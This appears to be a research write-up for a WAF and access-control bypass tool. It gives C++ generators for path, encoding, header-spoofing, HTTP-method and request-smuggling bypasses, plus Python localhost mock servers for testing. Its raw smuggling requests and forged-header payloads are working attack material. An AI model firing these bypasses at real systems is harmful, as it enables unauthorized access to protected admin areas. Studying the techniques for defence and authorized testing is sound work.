# Technique Research and Analysis

## Overview
This document provides detailed research on various bypass techniques for WAF and access control restrictions. Each technique includes theory, implementation considerations, and effectiveness analysis.

## 1. Path Manipulation Techniques

### 1.1 Trailing Slash Bypass

**Theory**:
Many access control systems check exact path matches. Adding a trailing slash can bypass this check while the backend normalizes it.

**Example**:
```
Blocked:   /admin
Bypass:    /admin/
```

**Implementation**:
```cpp
std::vector<std::string> generateTrailingSlash(const std::string& path) {
    std::vector<std::string> variations;
    
    if (!path.empty() && path.back() != '/') {
        variations.push_back(path + '/');
    }
    
    if (path.length() > 1 && path.back() == '/') {
        variations.push_back(path.substr(0, path.length() - 1));
    }
    
    return variations;
}
```

**Effectiveness**: High against simple WAF rules, low against modern WAFs

### 1.2 URL Encoding Bypass

**Theory**:
Different systems decode URLs differently. Some WAF rules match literal strings but don't account for encoded versions.

**Levels**:
1. **Single encoding**: `%2e` for `.`
2. **Double encoding**: `%252e` for `%2e`
3. **Triple encoding**: `%25252e` for `%252e`

**Example**:
```
Blocked:   /admin
Bypass:    /%61dmin        (single encoding of 'a')
Bypass:    /%2561dmin      (double encoding)
```

**Implementation**:
```cpp
std::string urlEncode(const std::string& str, int levels = 1) {
    static const char* hex = "0123456789ABCDEF";
    std::string result = str;
    
    for (int level = 0; level < levels; ++level) {
        std::string encoded;
        for (char c : result) {
            if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
                encoded += c;
            } else {
                encoded += '%';
                encoded += hex[(c >> 4) & 0xF];
                encoded += hex[c & 0xF];
            }
        }
        result = encoded;
    }
    
    return result;
}
```

**Effectiveness**: Medium to high, depends on WAF normalization

### 1.3 Case Variation

**Theory**:
Case-insensitive matching can be bypassed with different case combinations.

**Example**:
```
Blocked:   /admin
Bypass:    /Admin
Bypass:    /ADMIN
Bypass:    /aDmIn
```

**Implementation**:
```cpp
std::vector<std::string> generateCaseVariations(const std::string& path) {
    std::vector<std::string> variations;
    
    // All uppercase
    std::string upper = path;
    std::transform(upper.begin(), upper.end(), upper.begin(), ::toupper);
    variations.push_back(upper);
    
    // All lowercase (if different from original)
    std::string lower = path;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    if (lower != path) {
        variations.push_back(lower);
    }
    
    // Mixed case (toggle each character)
    for (size_t i = 0; i < path.length(); ++i) {
        std::string mixed = path;
        if (std::isalpha(mixed[i])) {
            mixed[i] = std::isupper(mixed[i]) ? 
                      std::tolower(mixed[i]) : std::toupper(mixed[i]);
            variations.push_back(mixed);
        }
    }
    
    return variations;
}
```

**Effectiveness**: Low on modern systems, occasionally effective

### 1.4 Path Traversal

**Theory**:
Using `./` or `../` sequences can confuse path normalization.

**Example**:
```
Blocked:   /admin
Bypass:    /./admin
Bypass:    /./././admin
Bypass:    /../admin
Bypass:    /allowed/../admin
```

**Implementation**:
```cpp
std::vector<std::string> generateTraversalPaths(const std::string& path) {
    std::vector<std::string> variations;
    
    // Single dot
    variations.push_back("/." + path);
    variations.push_back("/./." + path);
    
    // Current directory prefix
    if (path[0] == '/') {
        variations.push_back("/./" + path.substr(1));
        variations.push_back("/././" + path.substr(1));
    }
    
    // Parent directory (requires valid prefix)
    variations.push_back("/allowed/.." + path);
    variations.push_back("/public/.." + path);
    
    return variations;
}
```

**Effectiveness**: Medium, depends on backend normalization

### 1.5 Null Byte Injection

**Theory**:
Some languages (C, PHP older versions) treat null byte (`%00`) as string terminator.

**Example**:
```
Blocked:   /admin
Bypass:    /admin%00
Bypass:    /admin%00.jpg
```

**Implementation**:
```cpp
std::vector<std::string> generateNullByteVariations(const std::string& path) {
    std::vector<std::string> variations;
    
    variations.push_back(path + "%00");
    variations.push_back(path + "%00.jpg");
    variations.push_back(path + "%00.php");
    variations.push_back(path + "\x00");
    
    return variations;
}
```

**Effectiveness**: Very low on modern systems, mostly legacy

## 2. Header Forgery Techniques

### 2.1 X-Forwarded-For Spoofing

**Theory**:
Some access controls check client IP via `X-Forwarded-For` header. Spoofing this can bypass IP-based restrictions.

**Example**:
```http
GET /admin HTTP/1.1
Host: example.com
X-Forwarded-For: 127.0.0.1
```

**Common Values**:
- `127.0.0.1` (localhost)
- `::1` (IPv6 localhost)
- `0.0.0.0`
- `localhost`
- Internal IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)

**Implementation**:
```cpp
std::vector<Request> addXForwardedFor(const Request& base) {
    std::vector<Request> variations;
    
    std::vector<std::string> ips = {
        "127.0.0.1",
        "::1",
        "0.0.0.0",
        "localhost",
        "10.0.0.1",
        "172.16.0.1",
        "192.168.0.1"
    };
    
    for (const auto& ip : ips) {
        Request req = base;
        req.addHeader("X-Forwarded-For", ip);
        variations.push_back(req);
    }
    
    return variations;
}
```

**Effectiveness**: Medium, depends on backend trust of headers

### 2.2 X-Original-URL and X-Rewrite-URL

**Theory**:
Some reverse proxies (IIS, nginx) support rewrite headers that can override the actual URL.

**Example**:
```http
GET /allowed HTTP/1.1
Host: example.com
X-Original-URL: /admin
```

or

```http
GET / HTTP/1.1
Host: example.com
X-Rewrite-URL: /admin
```

**Implementation**:
```cpp
std::vector<Request> addRewriteHeaders(const Request& base, 
                                       const std::string& target) {
    std::vector<Request> variations;
    
    // Create request to allowed path with rewrite header
    Request req1 = base;
    req1.setPath("/");
    req1.addHeader("X-Original-URL", target);
    variations.push_back(req1);
    
    Request req2 = base;
    req2.setPath("/");
    req2.addHeader("X-Rewrite-URL", target);
    variations.push_back(req2);
    
    Request req3 = base;
    req3.setPath("/allowed");
    req3.addHeader("X-Original-URL", target);
    variations.push_back(req3);
    
    return variations;
}
```

**Effectiveness**: High against misconfigured reverse proxies

### 2.3 Host Header Attack

**Theory**:
Manipulating the Host header can cause different routing or authentication.

**Example**:
```http
GET /admin HTTP/1.1
Host: localhost
```

**Variations**:
- `Host: localhost`
- `Host: 127.0.0.1`
- `Host: example.com:80@attacker.com`
- Duplicate Host headers

**Implementation**:
```cpp
std::vector<Request> manipulateHostHeader(const Request& base) {
    std::vector<Request> variations;
    
    std::vector<std::string> hosts = {
        "localhost",
        "127.0.0.1",
        "::1",
        "0.0.0.0"
    };
    
    for (const auto& host : hosts) {
        Request req = base;
        req.setHeader("Host", host);
        variations.push_back(req);
    }
    
    // Duplicate Host header
    Request duplicate = base;
    duplicate.addHeader("Host", "localhost");
    variations.push_back(duplicate);
    
    return variations;
}
```

**Effectiveness**: Medium, depends on server configuration

## 3. Protocol Abuse Techniques

### 3.1 HTTP Version Manipulation

**Theory**:
Different HTTP versions are parsed differently. Some WAFs don't handle all versions.

**Versions**:
- HTTP/0.9 (no headers)
- HTTP/1.0 (simple)
- HTTP/1.1 (standard)
- HTTP/2.0 (binary)

**Example**:
```http
GET /admin HTTP/0.9
(no headers, no body)
```

**Implementation**:
```cpp
std::vector<Request> varyHTTPVersion(const Request& base) {
    std::vector<Request> variations;
    
    Request v09 = base;
    v09.setVersion("HTTP/0.9");
    v09.clearHeaders();  // HTTP/0.9 has no headers
    variations.push_back(v09);
    
    Request v10 = base;
    v10.setVersion("HTTP/1.0");
    variations.push_back(v10);
    
    Request v11 = base;
    v11.setVersion("HTTP/1.1");
    variations.push_back(v11);
    
    return variations;
}
```

**Effectiveness**: Low to medium, mostly legacy systems

### 3.2 HTTP Method Variation

**Theory**:
Access controls often check specific methods (GET, POST). Using alternative methods can bypass.

**Methods**:
- Standard: GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH
- Custom: GETT, POSTX, TRACE, CONNECT

**Example**:
```http
GETT /admin HTTP/1.1
Host: example.com
```

**Implementation**:
```cpp
std::vector<Request> varyMethod(const Request& base) {
    std::vector<Request> variations;
    
    std::vector<std::string> methods = {
        "GET", "POST", "PUT", "DELETE", "HEAD", 
        "OPTIONS", "PATCH", "TRACE", "CONNECT",
        "GETT", "POSTX", "get", "Get"
    };
    
    for (const auto& method : methods) {
        Request req = base;
        req.setMethod(method);
        variations.push_back(req);
    }
    
    return variations;
}
```

**Effectiveness**: Low, but sometimes successful

### 3.3 Content-Length vs Transfer-Encoding

**Theory**:
Conflicting Content-Length and Transfer-Encoding headers can cause desync between WAF and backend.

**Example**:
```http
POST /admin HTTP/1.1
Host: example.com
Content-Length: 5
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: example.com
```

**Implementation**: See Request Smuggling section

**Effectiveness**: High on vulnerable systems, low on patched

## 4. Encoding Techniques

### 4.1 Unicode Normalization

**Theory**:
Unicode characters can be represented in different forms (NFC, NFD, NFKC, NFKD). Normalization differences can bypass WAF.

**Example**:
```
Original: café (c, a, f, é)
NFC:      café (c, a, f, é as single character)
NFD:      café (c, a, f, e, combining accent)
```

**Implementation**:
```cpp
#include <unicode/normalizer2.h>

std::vector<std::string> normalizeUnicode(const std::string& str) {
    std::vector<std::string> variations;
    UErrorCode error = U_ZERO_ERROR;
    
    // NFC normalization
    const Normalizer2* nfc = Normalizer2::getNFCInstance(error);
    variations.push_back(nfc->normalize(str, error));
    
    // NFD normalization
    const Normalizer2* nfd = Normalizer2::getNFDInstance(error);
    variations.push_back(nfd->normalize(str, error));
    
    // NFKC normalization
    const Normalizer2* nfkc = Normalizer2::getNFKCInstance(error);
    variations.push_back(nfkc->normalize(str, error));
    
    // NFKD normalization
    const Normalizer2* nfkd = Normalizer2::getNFKDInstance(error);
    variations.push_back(nfkd->normalize(str, error));
    
    return variations;
}
```

**Effectiveness**: Medium, depends on WAF normalization

### 4.2 Homograph Attacks

**Theory**:
Different Unicode characters look similar but have different codes.

**Example**:
```
Latin 'a' (U+0061) vs Cyrillic 'а' (U+0430)
/admin vs /аdmin (Cyrillic 'а')
```

**Implementation**:
```cpp
std::map<char, std::vector<std::string>> homographs = {
    {'a', {"\u0061", "\u0430"}},  // Latin vs Cyrillic
    {'e', {"\u0065", "\u0435"}},
    {'o', {"\u006F", "\u043E"}},
    // ... more mappings
};

std::vector<std::string> generateHomographs(const std::string& str) {
    std::vector<std::string> variations;
    
    for (size_t i = 0; i < str.length(); ++i) {
        if (homographs.count(str[i])) {
            for (const auto& variant : homographs[str[i]]) {
                std::string modified = str;
                modified.replace(i, 1, variant);
                variations.push_back(modified);
            }
        }
    }
    
    return variations;
}
```

**Effectiveness**: Medium, creative but not always functional

### 4.3 Mixed Encoding

**Theory**:
Combining different encoding schemes can confuse parsers.

**Example**:
```
/%2561dmin           (double URL encoding + single)
/&#97;dmin           (HTML entity)
/\u0061dmin          (Unicode escape)
```

**Implementation**:
```cpp
std::vector<std::string> mixedEncoding(const std::string& path) {
    std::vector<std::string> variations;
    
    // URL + HTML entity
    std::string mixed1;
    for (char c : path) {
        if (c == 'a') {
            mixed1 += "&#97;";
        } else {
            mixed1 += c;
        }
    }
    variations.push_back(mixed1);
    
    // Single + double URL encoding
    std::string single = urlEncode(path, 1);
    std::string mixed2;
    for (size_t i = 0; i < single.length(); ++i) {
        if (i % 2 == 0 && single[i] == '%') {
            mixed2 += urlEncode(single.substr(i, 3), 1);
            i += 2;
        } else {
            mixed2 += single[i];
        }
    }
    variations.push_back(mixed2);
    
    return variations;
}
```

**Effectiveness**: Medium to high, creative bypasses

## 5. Request Smuggling

### 5.1 CL.TE (Content-Length vs Transfer-Encoding)

**Theory**:
Front-end uses Content-Length, backend uses Transfer-Encoding.

**Example**:
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**Implementation**:
```cpp
Request createCLTE(const std::string& smuggled) {
    Request req;
    req.setMethod("POST");
    req.setPath("/");
    
    std::string body = "0\r\n\r\n" + smuggled;
    
    req.addHeader("Content-Length", std::to_string(body.length() - smuggled.length()));
    req.addHeader("Transfer-Encoding", "chunked");
    req.setBody(body);
    
    return req;
}
```

**Effectiveness**: High on vulnerable configurations

### 5.2 TE.CL (Transfer-Encoding vs Content-Length)

**Theory**:
Front-end uses Transfer-Encoding, backend uses Content-Length.

**Example**:
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

**Effectiveness**: High on vulnerable configurations

## 6. Timing Techniques

### 6.1 Race Conditions

**Theory**:
Exploit time-of-check to time-of-use gaps.

**Implementation**:
```cpp
void raceConditionAttack(const std::string& url) {
    const int THREADS = 10;
    std::vector<std::thread> threads;
    
    for (int i = 0; i < THREADS; ++i) {
        threads.emplace_back([&url]() {
            HTTPClient client;
            client.get(url);
        });
    }
    
    for (auto& t : threads) {
        t.join();
    }
}
```

**Effectiveness**: Depends on specific vulnerability

## Testing Strategy with Python Localhost

### Mock Server for Path Bypass Testing
```python
#!/usr/bin/env python3
from flask import Flask, request

app = Flask(__name__)

@app.route('/<path:path>')
def test_path(path):
    # Strict matching
    if path == 'admin':
        return 'Forbidden', 403
    
    # Allow variations
    if path in ['admin/', 'ADMIN', 'admin/', '%61dmin']:
        return 'Bypass successful!', 200
    
    return 'Not found', 404

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8080)
```

### Mock WAF Server
```python
#!/usr/bin/env python3
from flask import Flask, request, Response

app = Flask(__name__)

BLOCKED_PATTERNS = ['/admin', '<script>', 'union select']

@app.before_request
def waf_check():
    # Check path
    for pattern in BLOCKED_PATTERNS:
        if pattern in request.path.lower():
            return Response('Blocked by WAF', status=403,
                          headers={'Server': 'MockWAF/1.0',
                                 'X-WAF-Block': 'true'})
    
    # Check headers
    if request.headers.get('X-Forwarded-For') == '127.0.0.1':
        pass  # Allow localhost
    
    return None  # Continue to route

@app.route('/<path:path>')
def handle_request(path):
    return f'Accessed: {path}', 200

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8081)
```

## Effectiveness Matrix

| Technique | Modern WAF | Legacy WAF | Misconfigured | Complexity |
|-----------|-----------|------------|---------------|-----------|
| Trailing slash | Low | High | High | Low |
| URL encoding | Medium | High | High | Low |
| Case variation | Low | Medium | Medium | Low |
| Path traversal | Medium | High | High | Medium |
| Null byte | Very Low | Medium | Low | Low |
| X-Forwarded-For | Medium | High | High | Low |
| X-Original-URL | High | High | High | Low |
| Host header | Medium | Medium | High | Low |
| HTTP version | Low | Medium | Medium | Low |
| Method variation | Low | Medium | Medium | Low |
| Unicode | Medium | Medium | High | High |
| Homographs | Low | Low | Medium | High |
| Smuggling | Very High | Medium | Very High | Very High |
| Racing | High | High | High | High |

## References

1. "HTTP Request Smuggling" - PortSwigger Research
2. "Unicode Security Mechanisms" - Unicode Consortium
3. "Bypassing Web Application Firewalls" - OWASP
4. "Advanced WAF Bypasses" - Various security researchers
5. RFC 7230-7235 - HTTP/1.1 Specification
6. RFC 7540 - HTTP/2 Specification

## Conclusion

Each technique has its place depending on the target system. The key is to:
1. Detect the WAF/protection mechanism
2. Select appropriate techniques
3. Combine techniques for higher success rate
4. Adapt based on responses
5. Test thoroughly with localhost mock servers

All testing must be done ethically with proper authorization and using Python localhost servers in the sandbox environment.
